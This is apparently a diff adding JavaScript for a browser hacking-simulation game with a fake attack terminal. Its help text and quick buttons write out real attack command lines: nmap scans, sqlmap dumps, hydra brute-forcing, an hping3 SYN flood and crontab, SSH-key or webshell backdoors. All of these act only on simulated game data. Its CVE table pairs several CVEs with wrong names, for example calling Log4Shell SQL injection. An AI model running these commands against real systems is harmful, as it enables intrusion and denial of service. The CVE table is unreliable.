+        data.market.btc = crypto ? (crypto.holding || 0) : 0;
+        data.market.reputation = investState.darknetReputation || 0;
+        var wsTools = investState.wsTools || {};
+        data.player.toolLevel = (wsTools.attackPowerBonus || 0);
+    } catch(e) {}
+}
+
+function removeFragmentFromWorldServer(fragId) {
+    try {
+        var raw = localStorage.getItem('worldServerState');
+        if (!raw) return;
+        var data = JSON.parse(raw);
+        data.player.dataFragments = (data.player.dataFragments || []).filter(function(f) { return f.id !== fragId; });
+        localStorage.setItem('worldServerState', JSON.stringify(data));
+    } catch(e) {}
+}
+
+function markServerBroken(data, server, cluster) {
+    if (server.isBroken) return;
+    server.isBroken = true;
+    server.hp = 0;
+    generateDataFragment(data, server, cluster);
+}
+
+
+function calcPlayerAttack(data) {
+    var atk = 10;
+    data.clusters.forEach(function(c) {
+        c.servers.forEach(function(s) {
+            if (s.isBroken) atk += s.level * 2;
+        });
+    });
+    // 工具等级加成
+    var tl = data.player ? (data.player.toolLevel || 0) : 0;
+    atk += tl * 5;
+    // 蜜罐减半（隧道攻破后蜜罐永久失效，不减半）
+    var tunnelBroken = data.tunnel && data.tunnel.isBroken;
+    if (!tunnelBroken && data.fbi.honeypotDebuffEnds > data.currentRound) atk = Math.floor(atk / 2);
+    return atk;
+}
+
+function calcPlayerDefense(data) {
+    var def = 5;
+    data.clusters.forEach(function(c) {
+        c.servers.forEach(function(s) {
+            if (s.isBroken) def += Math.ceil(s.level * 1.5);
+        });
+    });
+    return def;
+}
+
+function countBrokenServers(data) {
+    var count = 0;
+    data.clusters.forEach(function(c) {
+        c.servers.forEach(function(s) { if (s.isBroken) count++; });
+    });
+    return count;
+}
+
+function countOwnedClusters(data) {
+    return data.clusters.filter(function(c){return c.isOwned;}).length;
+}
+
+function countForceRepairedServers(data) {
+    var count = 0;
+    data.clusters.forEach(function(c) {
+        c.servers.forEach(function(s) { if (s.forceRepairBuff > 0) count++; });
+    });
+    return count;
+}
+
+function checkForceRepair(server, data) {
+    if (server.forceRepairBuff <= 0) return { blocked: false, reduced: false, damageMul: 1 };
+    if (Math.random() < 0.7) {
+        return { blocked: true, reduced: false, damageMul: 0 };
+    }
+    return { blocked: false, reduced: true, damageMul: 0.1 };
+}
+
+// ===== 解锁检测 =====
+function checkUnlock() {
+    var data = loadData();
+    var hackData = null;
+    try { hackData = JSON.parse(localStorage.getItem('hackTrainingProgress') || 'null'); } catch(e) {}
+    var allDone = false;
+    if (hackData && hackData.nodes) {
+        allDone = ['firewall','gateway','database','appcore'].every(function(k) {
+            return (hackData.nodes[k] || {}).progress >= 100;
+        });
+    }
+    if (allDone && !data.unlocked) {
+        data.unlocked = true;
+        addLog(data, 'system', '世界服务器已解锁！万维网攻防模拟启动。');
+        saveData(data);
+    }
+    if (!data.unlocked) {
+        document.getElementById('lockedOverlay').style.display = 'flex';
+        return false;
+    }
+    document.getElementById('lockedOverlay').style.display = 'none';
+    return true;
+}
+
+// ===== Tab切换 =====
+function switchTab(name) {
+    document.querySelectorAll('.tab-btn').forEach(function(b){b.classList.remove('active');});
+    document.querySelectorAll('.tab-content').forEach(function(c){c.classList.remove('active');});
+    event.target.classList.add('active');
+    document.getElementById('tab-' + name).classList.add('active');
+    var data = loadData();
+    if (name === 'map') renderMap(data);
+    if (name === 'cluster') renderClusterView(data);
+    if (name === 'botnet') renderBotnet(data);
+    if (name === 'fbi') renderFBI(data);
+    if (name === 'tunnel') renderTunnel(data);
+    if (name === 'logs') renderLogs(data);
+    if (name === 'virus') renderVirus(data);
+    if (name === 'zeroday') renderZeroDay(data);
+    if (name === 'automine') renderAutoMine(data);
+}
+
+// ===== 渲染：状态栏 =====
+function renderStats(data) {
+    data.player.attackPower = calcPlayerAttack(data);
+    data.player.defensePower = calcPlayerDefense(data);
+    data.player.ownedServers = countBrokenServers(data);
+    document.getElementById('statAttack').textContent = data.player.attackPower;
+    document.getElementById('statDefense').textContent = data.player.defensePower;
+    document.getElementById('statBotnet').textContent = countOwnedClusters(data);
+    document.getElementById('statBroken').textContent = data.player.ownedServers;
+    document.getElementById('statRound').textContent = data.currentRound;
+}
+
+// ===== 渲染：世界地图（SVG拓扑图） =====
+function renderMap(data) {
+    // 节点位置：两个网络分左右两侧
+    var positions = {
+        0: {x: 400, y: 70},   // 电商云 B
+        1: {x: 120, y: 70},   // 政府内网 A
+        2: {x: 250, y: 70},   // 金融科技 A
+        3: {x: 530, y: 70},   // 社交媒体 B
+        4: {x: 120, y: 170},  // 学术科研 A
+        5: {x: 250, y: 170},  // 工业控制 A
+        6: {x: 380, y: 170},  // 医疗健康 A  (wait, this is network A but visually on right)
+        7: {x: 400, y: 170},  // 游戏服务 B
+        8: {x: 530, y: 170},  // 暗网市场 B
+        9: {x: 530, y: 270}   // 国际根服务器 B
+    };
+    // Fix: medical is network A, gaming is network B
+    // Network A (left side): 1政府,2金融,4学术,5工业,6医疗
+    // Network B (right side): 0电商,3社交,7游戏,8暗网,9根服务器
+    positions = {
+        1: {x: 90,  y: 70},   // 政府内网
+        2: {x: 220, y: 70},   // 金融科技
+        4: {x: 90,  y: 160},  // 学术科研
+        5: {x: 220, y: 160},  // 工业控制
+        6: {x: 155, y: 250},  // 医疗健康
+        0: {x: 430, y: 70},   // 电商云
+        3: {x: 560, y: 70},   // 社交媒体
+        7: {x: 430, y: 160},  // 游戏服务
+        8: {x: 560, y: 160},  // 暗网市场
+        9: {x: 560, y: 250}   // 国际根服务器
+    };
+
+    var svg = '<svg class="map-svg" viewBox="0 0 680 340" xmlns="http://www.w3.org/2000/svg">';
+    svg += '<text x="170" y="25" text-anchor="middle" font-size="11" fill="#534AB7" font-weight="500">网络A：政务科研网</text>';
+    svg += '<text x="495" y="25" text-anchor="middle" font-size="11" fill="#0F6E56" font-weight="500">网络B：商业互联网</text>';
+    // 网络分隔线
+    svg += '<line x1="325" y1="30" x2="325" y2="310" stroke="#003300" stroke-width="0.5" stroke-dasharray="4,4"/>';
+
+    // 连接线
+    var drawn = {};
+    data.clusters.forEach(function(c) {
+        c.connections.forEach(function(connId) {
+            var key = Math.min(c.id, connId) + '-' + Math.max(c.id, connId);
+            if (drawn[key]) return;
+            drawn[key] = true;
+            var p1 = positions[c.id], p2 = positions[connId];
+            var isTunnel = (c.id === 1 && connId === 9) || (c.id === 9 && connId === 1);
+            var bothOwned = c.isOwned && getCluster(data, connId).isOwned;
+            if (isTunnel) {
+                var tBroken = data.tunnel && data.tunnel.isBroken;
+                var tColor = tBroken ? '#00ff41' : '#ff6600';
+                var tCls = tBroken ? 'link-line tunnel-owned' : 'link-line tunnel';
+                // 可点击的粗线（透明，用于点击命中）
+                svg += '<line x1="' + p1.x + '" y1="' + p1.y + '" x2="' + p2.x + '" y2="' + p2.y + '" stroke="transparent" stroke-width="15" style="cursor:pointer;" onclick="selectTunnel()"/>';
+                svg += '<line class="' + tCls + '" x1="' + p1.x + '" y1="' + p1.y + '" x2="' + p2.x + '" y2="' + p2.y + '" style="pointer-events:none;"/>';
+            } else {
+                var cls = bothOwned ? 'link-line owned' : 'link-line';
+                svg += '<line class="' + cls + '" x1="' + p1.x + '" y1="' + p1.y + '" x2="' + p2.x + '" y2="' + p2.y + '"/>';
+            }
+        });
+    });
+
+    // 节点
+    data.clusters.forEach(function(c) {
+        var p = positions[c.id];
+        var isProtected = data.fbi.protectedClusters.indexOf(c.id) >= 0;
+        var nodeCls = 'cluster-node ';
+        if (c.isOwned) nodeCls += 'cluster-owned';
+        else if (c.isBroken) nodeCls += 'cluster-broken';
+        else nodeCls += 'cluster-normal';
+        if (isProtected) nodeCls += ' cluster-protected';
+
+        var brokenCount = c.servers.filter(function(s){return s.isBroken;}).length;
+        var fillColor = c.isOwned ? '#004400' : (brokenCount > 0 ? '#330000' : '#001a00');
+        var strokeColor = c.isOwned ? '#00ff41' : (brokenCount > 0 ? '#ff4444' : '#006600');
+        if (isProtected) strokeColor = '#ffaa00';
+
+        svg += '<g class="' + nodeCls + '" onclick="selectCluster(' + c.id + ')">';
+        svg += '<circle cx="' + p.x + '" cy="' + p.y + '" r="22" fill="' + fillColor + '" stroke="' + strokeColor + '" stroke-width="' + (isProtected ? '2.5' : '1.5') + '"/>';
+        // 破损进度
+        if (brokenCount > 0 && !c.isOwned) {
+            var pct = brokenCount / c.servers.length;
+            svg += '<circle cx="' + p.x + '" cy="' + p.y + '" r="22" fill="none" stroke="#ff4444" stroke-width="2" stroke-dasharray="' + (2*Math.PI*22*pct) + ' ' + (2*Math.PI*22*(1-pct)) + '" transform="rotate(-90 ' + p.x + ' ' + p.y + ')" opacity="0.6"/>';
+        }
+        svg += '<text class="cluster-label" x="' + p.x + '" y="' + (p.y + 3) + '" fill="' + (c.isOwned ? '#00ff41' : '#00aa00') + '">' + c.name + '</text>';
+        svg += '<text class="cluster-level" x="' + p.x + '" y="' + (p.y + 38) + '">' + brokenCount + '/' + c.servers.length + ' Lv.' + c.levelRange[0] + '-' + c.levelRange[1] + '</text>';
+        if (isProtected && data.fbi.honeypotActive) {
+            svg += '<text x="' + (p.x + 24) + '" y="' + (p.y - 18) + '" font-size="12" fill="#ff1744">🍯</text>';
+        } else if (isProtected) {
+            svg += '<text x="' + (p.x + 24) + '" y="' + (p.y - 18) + '" font-size="12" fill="#ffaa00">🛡</text>';
+        }
+        svg += '</g>';
+    });
+
+    // 代理隧道标签
+    var tLabelColor = (data.tunnel && data.tunnel.isBroken) ? '#00ff41' : '#993C1D';
+    var tLabelText = data.tunnel ? (data.tunnel.isBroken ? '代理隧道 [已攻破]' : '代理隧道 HP:' + data.tunnel.hp + '/' + data.tunnel.maxHp) : '代理隧道';
+    svg += '<text x="325" y="185" text-anchor="middle" font-size="9" fill="' + tLabelColor + '" style="cursor:pointer;" onclick="selectTunnel()">' + tLabelText + '</text>';
+
+    svg += '</svg>';
+    document.getElementById('mapContainer').innerHTML = svg;
+}
+
+function selectTunnel() {
+    var data = loadData();
+    // 切换到隧道tab
+    document.querySelectorAll('.tab-btn').forEach(function(b){b.classList.remove('active');});
+    document.querySelectorAll('.tab-content').forEach(function(c){c.classList.remove('active');});
+    document.querySelectorAll('.tab-btn').forEach(function(b){
+        if (b.textContent.indexOf('代理隧道') >= 0) b.classList.add('active');
+    });
+    document.getElementById('tab-tunnel').classList.add('active');
+    renderTunnel(data);
+}
+
+function selectCluster(id) {
+    var data = loadData();
+    data.selectedClusterId = id;
+    saveData(data);
+    // 切换到服务器群tab
+    document.querySelectorAll('.tab-btn').forEach(function(b){b.classList.remove('active');});
+    document.querySelectorAll('.tab-content').forEach(function(c){c.classList.remove('active');});
+    document.querySelectorAll('.tab-btn')[1].classList.add('active');
+    document.getElementById('tab-cluster').classList.add('active');
+    renderClusterView(data);
+}
+
+// ===== 渲染：服务器群详情 =====
+function renderClusterView(data) {
+    var el = document.getElementById('clusterView');
+    if (data.selectedClusterId < 0) {
+        el.innerHTML = '<p style="color:#006600;font-size:12px;">请在世界地图中选择一个服务器群。</p>';
+        return;
+    }
+    var c = getCluster(data, data.selectedClusterId);
+    if (!c) return;
+    var brokenCount = c.servers.filter(function(s){return s.isBroken;}).length;
+    var isProtected = data.fbi.protectedClusters.indexOf(c.id) >= 0;
+    var hasHoneypot = isProtected && data.fbi.honeypotActive;
+
+    var html = '<div class="cluster-header">';
+    html += '<h2>🌐 ' + c.name + '</h2>';
+    html += '<span class="cluster-badge badge-' + (c.isOwned ? 'owned' : 'normal') + '" style="color:#006600;border-color:#006600;">网络' + c.network + ' · Lv.' + c.levelRange[0] + '-' + c.levelRange[1] + '</span>';
+    if (brokenCount > 0) html += '<span class="cluster-badge" style="color:#ff4444;border-color:#ff4444;">已攻破 ' + brokenCount + '/' + c.servers.length + '</span>';
+    if (c.isOwned) html += '<span class="cluster-badge badge-owned">🧟 已占领</span>';
+    if (isProtected) html += '<span class="cluster-badge badge-protected">🛡️ FBI保护中</span>';
+    if (hasHoneypot) html += '<span class="cluster-badge badge-honeypot">🍯 蜜罐已开启</span>';
+    html += '</div>';
+
+    // 连接的群
+    html += '<div style="font-size:10px;color:#005500;margin-bottom:10px;">连接: ';
+    c.connections.forEach(function(connId) {
+        var conn = getCluster(data, connId);
+        if (conn) html += '<span style="color:' + (conn.isOwned ? '#00ff41' : '#008800') + ';" onclick="selectCluster(' + connId + ')" style="cursor:pointer;">' + conn.name + '</span> ';
+    });
+    html += '</div>';
+
+    // 终端
+    html += '<div class="terminal" id="termOutput"></div>';
+    html += '<div class="cmd-input-row">';
+    html += '<input type="text" class="cmd-input" id="cmdInput" placeholder="输入命令 (help查看帮助)..." onkeydown="if(event.key===\'Enter\')executeCommand()"/>';
+    html += '<button class="quick-btn" onclick="executeCommand()">▶ 执行</button>';
+    html += '</div>';
+    html += '<div class="quick-btns">';
+    html += '<button class="quick-btn" onclick="quickCmd(\'scan_all\')">📡 nmap -sV -A</button>';
+    html += '<button class="quick-btn" onclick="quickCmd(\'exploit_auto\')">⚔️ exploit</button>';
+    html += '<button class="quick-btn" onclick="quickCmd(\'brute_force\')">🔐 hydra</button>';
+    html += '<button class="quick-btn" onclick="quickCmd(\'sql_inject\')">💉 sqlmap</button>';
+    html += '<button class="quick-btn" onclick="quickCmd(\'ddos\')">💥 hping3</button>';
+    html += '<button class="quick-btn" onclick="quickCmd(\'full_auto\')">🚀 全自动</button>';
+    html += '</div>';
+
+    // 服务器列表
+    html += '<div class="server-grid">';
+    c.servers.forEach(function(s) {
+        var hpPct = s.maxHp > 0 ? (s.hp / s.maxHp * 100) : 0;
+        var hpCls = s.isBroken ? 'hp-zero' : (hpPct > 60 ? 'hp-high' : (hpPct > 30 ? 'hp-mid' : 'hp-low'));
+        var cardCls = 'server-card' + (s.isBroken ? ' broken' : '') + (data.selectedServerId === s.id ? ' targeting' : '');
+        var icon = s.isBroken ? '✅' : (s.reconDone ? '🔍' : '⬜');
+        html += '<div class="' + cardCls + '" onclick="selectServer(\'' + s.id + '\')">';
+        html += '<div><span class="srv-name">' + icon + ' ' + s.name + '</span> <span style="font-size:9px;color:#004400;">Lv.' + s.level + '</span></div>';
+        if (s.reconDone) {
+            html += '<div class="srv-info">' + s.ip + ' · ' + s.os + ' · ' + s.serviceType + '</div>';
+        } else {
+            html += '<div class="srv-info" style="color:#003300;">未侦察 · ' + s.ip + '</div>';
+        }
+        if (!s.isBroken) {
+            html += '<div class="server-hp-bar"><div class="server-hp-fill ' + hpCls + '" style="width:' + hpPct + '%"></div></div>';
+            html += '<div style="font-size:8px;color:#004400;margin-top:2px;">HP ' + s.hp + '/' + s.maxHp + ' · DEF ' + s.defense + '</div>';
+        } else {
+            html += '<div style="font-size:9px;color:#00ff41;margin-top:2px;">✓ 已攻破 · 已占领</div>';
+        }
+        html += '</div>';
+    });
+    html += '</div>';
+
+    el.innerHTML = html;
+    // 初始化终端
+    termInit();
+}
+
+function selectServer(sid) {
+    var data = loadData();
+    data.selectedServerId = sid;
+    saveData(data);
+    var c = getCluster(data, data.selectedClusterId);
+    var s = getServer(c, sid);
+    if (s && !s.isBroken) {
+        termPrint('[*] Target selected: ' + s.name + ' (' + s.ip + ')', 'term-info');
+        if (!s.reconDone) {
+            termPrint('[*] Run: nmap -sV -A ' + s.ip, 'term-warn');
+        } else {
+            termPrint('[*] Vulnerabilities: ' + s.vulnerabilities.join(', '), 'term-out');
+            termPrint('[*] Try: exploit ' + s.ip + ' --type=' + s.vulnerabilities[0], 'term-out');
+            termPrint('[*] Or:  sqlmap -u http://' + s.ip + '/ --batch --dbs', 'term-dim');
+        }
+    }
+    renderClusterView(data);
+}
+
+// ===== 终端系统 =====
+var termHistory = [];
+
+function termInit() {
+    var el = document.getElementById('termOutput');
+    if (!el) return;
+    if (el.dataset.inited) return;
+    el.dataset.inited = '1';
+    termPrint('// World Wide Web Attack Terminal v5.0', 'term-info');
+    termPrint('// Type "help" for command reference', 'term-info');
+    termPrint('// Tip: Select a server, run nmap, then exploit', 'term-dim');
+    termPrint('', 'term-out');
+}
+
+function termPrint(text, cls) {
+    var el = document.getElementById('termOutput');
+    if (!el) return;
+    var line = document.createElement('div');
+    line.className = 'term-line ' + (cls || 'term-out');
+    line.textContent = text;
+    el.appendChild(line);
+    el.scrollTop = el.scrollHeight;
+}
+
+function termPrintCmd(cmd) {
+    var el = document.getElementById('termOutput');
+    if (!el) return;
+    var line = document.createElement('div');
+    line.className = 'term-line term-cmd';
+    line.textContent = cmd;
+    el.appendChild(line);
+    el.scrollTop = el.scrollHeight;
+}
+
+function getSelectedServer() {
+    var data = loadData();
+    if (data.selectedClusterId < 0 || !data.selectedServerId) return null;
+    var c = getCluster(data, data.selectedClusterId);
+    if (!c) return null;
+    return getServer(c, data.selectedServerId);
+}
+
+function executeCommand() {
+    var input = document.getElementById('cmdInput');
+    if (!input) return;
+    var cmd = input.value.trim();
+    if (!cmd) return;
+    input.value = '';
+    termPrintCmd(cmd);
+    parseCommand(cmd);
+}
+
+function quickCmd(type) {
+    CMD_DATA = loadData(); // 设置全局共享data，避免子函数重复loadData产生副本
+    var data = CMD_DATA;
+    if (data.selectedClusterId < 0) { termPrint('[-] 请先选择服务器群', 'term-err'); CMD_DATA = null; return; }
+    var c = getCluster(data, data.selectedClusterId);
+    var target = data.selectedServerId ? getServer(c, data.selectedServerId) : null;
+
+    switch(type) {
+        case 'scan_all':
+            termPrintCmd('nmap -sV -A ' + c.name + '/24');
+            cmdNmapReal(c, ['-sV', '-A']);
+            break;
+        case 'exploit_auto':
+            if (!target) { termPrint('[-] 请先选择一台服务器', 'term-err'); CMD_DATA = null; return; }
+            var vuln = target.vulnerabilities[0] || 'rce';
+            termPrintCmd('exploit ' + target.ip + ' --type=' + vuln);
+            cmdExploitReal(target, vuln);
+            break;
+        case 'brute_force':
+            if (!target) { termPrint('[-] 请先选择一台服务器', 'term-err'); CMD_DATA = null; return; }
+            termPrintCmd('hydra -L users.txt -P rockyou.txt ' + target.ip + ' ' + target.serviceType.toLowerCase());
+            cmdHydraReal(['-L', 'users.txt', '-P', 'rockyou.txt', target.ip, target.serviceType.toLowerCase()], data);
+            break;
+        case 'sql_inject':
+            if (!target) { termPrint('[-] 请先选择一台服务器', 'term-err'); CMD_DATA = null; return; }
+            termPrintCmd('sqlmap -u http://' + target.ip + '/ --batch --dbs');
+            cmdSqlmapReal(['-u', 'http://' + target.ip + '/', '--batch', '--dbs'], data);
+            break;
+        case 'ddos':
+            if (!target) { termPrint('[-] 请先选择一台服务器', 'term-err'); CMD_DATA = null; return; }
+            termPrintCmd('hping3 --flood -S ' + target.ip);
+            cmdDdosReal(target);
+            break;
+        case 'full_auto':
+            if (!target) { termPrint('[-] 请先选择一台服务器', 'term-err'); CMD_DATA = null; return; }
+            termPrintCmd('full_auto ' + target.ip);
+            cmdFullAuto(target);
+            break;
+    }
+}
+
+// ===== 命令解析器（真实命令行格式） =====
+// ===== 命令解析 =====
+// 全局变量：当前命令执行期间的数据引用，避免多次loadData导致副本不一致
+var CMD_DATA = null;
+function parseCommand(cmd) {
+    var parts = cmd.split(/\s+/).filter(function(p){return p.length>0;});
+    var main = parts[0].toLowerCase();
+    CMD_DATA = loadData(); // 只加载一次
+    var data = CMD_DATA;
+    var args = parts.slice(1);
+
+    switch(main) {
+        case 'help':
+        case '?':
+            termPrint('╔══════════════════════════════════════════════╗', 'term-info');
+            termPrint('║        WORLD WEB ATTACK TERMINAL v5.0        ║', 'term-info');
+            termPrint('╚══════════════════════════════════════════════╝', 'term-info');
+            termPrint('', 'term-out');
+            termPrint('【侦察扫描】', 'term-warn');
+            termPrint('  nmap [options] <target>      网络端口扫描', 'term-out');
+            termPrint('    -sS  SYN半开扫描           -sV  服务版本探测', 'term-out');
+            termPrint('    -O   操作系统检测          -p <ports> 指定端口', 'term-out');
+            termPrint('    -A   全面扫描              --script <n> 脚本扫描', 'term-out');
+            termPrint('  whois <ip>                   域名信息查询', 'term-out');
+            termPrint('', 'term-out');
+            termPrint('【漏洞利用】', 'term-warn');
+            termPrint('  msfconsole                    启动Metasploit控制台', 'term-out');
+            termPrint('    use exploit/<module>        选择漏洞模块', 'term-out');
+            termPrint('    set RHOSTS <ip>             设置目标IP', 'term-out');
+            termPrint('    set PAYLOAD <payload>       设置载荷', 'term-out');
+            termPrint('    exploit / run               执行攻击', 'term-out');
+            termPrint('  exploit <ip> [--type=<vuln>] 快速漏洞利用', 'term-out');
+            termPrint('', 'term-out');
+            termPrint('【注入攻击】', 'term-warn');
+            termPrint('  sqlmap -u <url> [options]    SQL注入自动化工具', 'term-out');
+            termPrint('    --dbs    枚举数据库         --tables  枚举表', 'term-out');
+            termPrint('    --dump   导出数据           --batch   自动确认', 'term-out');
+            termPrint('', 'term-out');
+            termPrint('【密码爆破】', 'term-warn');
+            termPrint('  hydra -L <userlist> -P <passlist> <ip> <svc>', 'term-out');
+            termPrint('    -t <threads>  并发线程      -f  成功即停止', 'term-out');
+            termPrint('  john --wordlist=<file> <hash>  密码哈希破解', 'term-out');
+            termPrint('', 'term-out');
+            termPrint('【后渗透】', 'term-warn');
+            termPrint('  privesc                       本地提权扫描', 'term-out');
+            termPrint('  persist [--method=<type>]     植入持久化后门', 'term-out');
+            termPrint('    --method=crontab   计划任务  --method=sshkey  SSH公钥', 'term-out');
+            termPrint('    --method=webshell  Web后门', 'term-out');
+            termPrint('', 'term-out');
+            termPrint('【分布式攻击】', 'term-warn');
+            termPrint('  hping3 --flood <ip>           DDoS洪水攻击', 'term-out');
+            termPrint('  ddos <ip>                     快速DDoS', 'term-out');
+            termPrint('', 'term-out');
+            termPrint('【终端控制】', 'term-warn');
+            termPrint('  clear / cls                   清屏', 'term-out');
+            termPrint('  back                          返回世界地图', 'term-out');
+            termPrint('  whoami                        显示当前身份', 'term-out');
+            termPrint('  ls / ps / netstat            伪装shell命令', 'term-out');
+            termPrint('  help / ?                      显示帮助', 'term-out');
+            break;
+        case 'nmap':
+        case 'scan':
+            cmdNmapReal(getCluster(data, data.selectedClusterId), args);
+            break;
+        case 'whois':
+            var whoisSrv = findServerByIp(data, args[0]);
+            if (whoisSrv) cmdWhois(whoisSrv);
+            else termPrint('whois: 目标 ' + (args[0]||'') + ' 未找到', 'term-err');
+            break;
+        case 'msfconsole':
+        case 'msf':
+            termPrintMsfBanner();
+            termPrint('', 'term-out');
+            termPrint('[*] 启动 Metasploit Framework Console...', 'term-info');
+            termPrint('[*] 使用 use exploit/<module> 选择漏洞模块', 'term-warn');
+            termPrint('[*] 或直接输入 exploit <ip> --type=<vuln> 快速攻击', 'term-warn');
+            break;
+        case 'exploit':
+            var ip = args[0];
+            var vulnType = 'auto';
+            args.forEach(function(p) { if (p.indexOf('--type=') === 0) vulnType = p.substring(7); });
+            var srv = findServerByIp(data, ip);
+            if (srv) cmdExploitReal(srv, vulnType);
+            else termPrint('[-] 未找到目标IP: ' + (ip||'') + '，请先 nmap 扫描', 'term-err');
+            break;
+        case 'sqlmap':
+            cmdSqlmapReal(args, data);
+            break;
+        case 'hydra':
+            cmdHydraReal(args, data);
+            break;
+        case 'john':
+            termPrint('john: 离线哈希破解工具', 'term-info');
+            termPrint('[*] 加载字典: rockyou.txt (14,344,391 entries)', 'term-out');
+            termPrint('[*] 请在获得密码哈希后使用', 'term-warn');
+            break;
+        case 'privesc':
+            var sel = getSelectedServer();
+            if (sel) cmdPrivescReal(sel);
+            else termPrint('[-] 请先选择一台服务器', 'term-err');
+            break;
+        case 'persist':
+        case 'backdoor':
+            var sel2 = getSelectedServer();
+            if (sel2) {
+                var method = 'crontab';
+                args.forEach(function(p) { if (p.indexOf('--method=') === 0) method = p.substring(9); });
+                cmdPersistReal(sel2, method);
+            } else termPrint('[-] 请先选择服务器', 'term-err');
+            break;
+        case 'hping3':
+        case 'ddos':
+            var ddosTarget = null;
+            if (main === 'hping3') {
+                var floodIdx = args.indexOf('--flood');
+                var ipArg = args.find(function(a){return a.indexOf('10.')===0;});
+                ddosTarget = findServerByIp(data, ipArg);
+            } else {
+                ddosTarget = findServerByIp(data, args[0]);
+            }
+            if (ddosTarget) cmdDdosReal(ddosTarget);
+            else termPrint('[-] 未找到DDoS目标', 'term-err');
+            break;
+        case 'clear':
+        case 'cls':
+            document.getElementById('termOutput').innerHTML = '';
+            break;
+        case 'back':
+            switchTab('map');
+            break;
+        case 'whoami':
+            var selSrv = getSelectedServer();
+            if (selSrv && selSrv.isBroken) {
+                termPrint('root', 'term-ok');
+            } else if (selSrv && selSrv.hp < selSrv.maxHp) {
+                termPrint('www-data', 'term-warn');
+            } else {
+                termPrint('attacker@worldnet:~$', 'term-out');
+            }
+            break;
+        case 'ls':
+            termPrint('exploits/  payloads/  wordlists/  sessions/  loot/', 'term-dim');
+            break;
+        case 'ps':
+            termPrint('  PID TTY          TIME CMD', 'term-dim');
+            termPrint('    1 ?        00:00:02 init', 'term-dim');
+            termPrint('  234 ?        00:00:00 sshd', 'term-dim');
+            termPrint('  567 ?        00:00:01 nginx', 'term-dim');
+            break;
+        case 'netstat':
+            termPrint('Proto Local Address    Foreign Address  State', 'term-dim');
+            termPrint('tcp   0.0.0.0:22       0.0.0.0:*        LISTEN', 'term-dim');
+            termPrint('tcp   0.0.0.0:80       0.0.0.0:*        LISTEN', 'term-dim');
+            termPrint('tcp   0.0.0.0:443      0.0.0.0:*        LISTEN', 'term-dim');
+            break;
+        default:
+            termPrint('bash: ' + main + ': command not found', 'term-err');
+            termPrint('输入 help 查看可用命令', 'term-dim');
+    }
+}
+
+function findServerByIp(data, ip) {
+    if (!ip) return getSelectedServer();
+    // 去除 http:// 前缀和路径
+    ip = ip.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+    for (var i = 0; i < data.clusters.length; i++) {
+        var s = data.clusters[i].servers.find(function(sv){return sv.ip === ip;});
+        if (s) return s;
+    }
+    return null;
+}
+
+// 获取服务器所属群
+function getServerCluster(data, server) {
+    for (var i = 0; i < data.clusters.length; i++) {
+        if (data.clusters[i].servers.indexOf(server) >= 0) return data.clusters[i];
+    }
+    return null;
+}
+
+// 真实端口号映射
+var SERVICE_PORTS = {
+    'HTTP': 80, 'SSH': 22, 'FTP': 21, 'Database': 3306,
+    'API': 8080, 'Mail': 25, 'DNS': 53, 'Proxy': 3128
+};
+
+// 真实服务版本字符串
+var SERVICE_VERSIONS = {
+    'HTTP': ['Apache/2.4.41', 'nginx/1.18.0', 'IIS/10.0', 'Apache/2.2.15'],
+    'SSH': ['OpenSSH_7.4', 'OpenSSH_8.2p1', 'OpenSSH_6.6.1'],
+    'FTP': ['vsftpd/3.0.3', 'ProFTPD/1.3.5', 'FileZilla/0.9.41'],
+    'Database': ['MySQL/5.7.32', 'PostgreSQL/12.3', 'MongoDB/4.4.1', 'MSSQL/2019'],
+    'API': ['Node.js/16.14', 'Tomcat/9.0.45', 'Gunicorn/20.1.0'],
+    'Mail': ['Postfix/3.5.6', 'Sendmail/8.15.2'],
+    'DNS': ['BIND/9.11.3', 'dnsmasq/2.79'],
+    'Proxy': ['Squid/4.13', 'HAProxy/2.2.9']
+};
+
+// 真实漏洞CVE映射
+var VULN_CVE_MAP = {
+    'sql_injection': { cve: 'CVE-2021-44228', name: 'SQL Injection (Log4Shell)', msfModule: 'exploit/multi/http/log4shell_header_injection' },
+    'weak_ssh': { cve: 'CVE-2018-15473', name: 'OpenSSH User Enumeration', msfModule: 'auxiliary/scanner/ssh/ssh_enumusers' },
+    'xss': { cve: 'CVE-2020-17463', name: 'Reflected XSS', msfModule: 'exploit/multi/http/wp_cve_2020_17463' },
+    'rce': { cve: 'CVE-2021-41773', name: 'Apache Path Traversal RCE', msfModule: 'exploit/multi/http/normalize_path' },
+    'lfi': { cve: 'CVE-2021-41773', name: 'Local File Inclusion', msfModule: 'exploit/unix/webapp/wp_admin_shell_upload' },
+    'priv_esc': { cve: 'CVE-2021-4034', name: 'PwnKit (pkexec)', msfModule: 'exploit/linux/local/pkexec' },
+    'weak_ftp': { cve: 'CVE-2019-12815', name: 'ProFTPD mod_copy', msfModule: 'exploit/unix/ftp/proftpd_modcopy_exec' },
+    'open_port': { cve: 'CVE-2020-1938', name: 'Ghostcat (AJP)', msfModule: 'exploit/multi/http/tomcat_ghostcat' },
+    'default_pass': { cve: 'CVE-2017-7921', name: 'Default Credentials', msfModule: 'auxiliary/scanner/http/login' }
+};
+
+// Metasploit Banner
+function termPrintMsfBanner() {
+    var banner = [
+        '                                  ',
+        '        ,           ,            ',
+        '       /             \\           ',
+        '      ((__-^^-,-^^-__))         ',
+        '       `-_---\' \'---_-\'          ',
+        '        <__|o` \'o|__>           ',
+        '           \\  -  /               ',
+        '            |===|                ',
+        '            \\___/                ',
+        '                                  '
+    ];
+    banner.forEach(function(line) { termPrint(line, 'term-dim'); });
+}
+
+// ===== Nmap 真实端口扫描 =====
+function cmdNmapReal(cluster, args) {
+    if (!cluster) { termPrint('[-] 请先选择服务器群', 'term-err'); return; }
+    var data = CMD_DATA || loadData(); // 使用parseCommand加载的同一份数据
+    
+    // 解析参数
+    var doVersion = args.indexOf('-sV') >= 0 || args.indexOf('-A') >= 0;
+    var doOS = args.indexOf('-O') >= 0 || args.indexOf('-A') >= 0;
+    var doScript = false;
+    var scriptName = '';
+    args.forEach(function(a) {
+        if (a.indexOf('--script') === 0) { doScript = true; if (a.indexOf('=')>0) scriptName = a.split('=')[1]; }
+    });
+    var portArg = null;
+    args.forEach(function(a) { if (a.indexOf('-p')===0 && a.length>2) portArg = a.substring(2); });
+    if (!portArg) { var pIdx = args.indexOf('-p'); if (pIdx>=0 && args[pIdx+1]) portArg = args[pIdx+1]; }
+    
+    // 确定扫描目标 — 从同一份data中查找
+    var ipArg = args.find(function(a){return a.indexOf('10.')===0 || a.indexOf('/')>0;});
+    var targets = [];
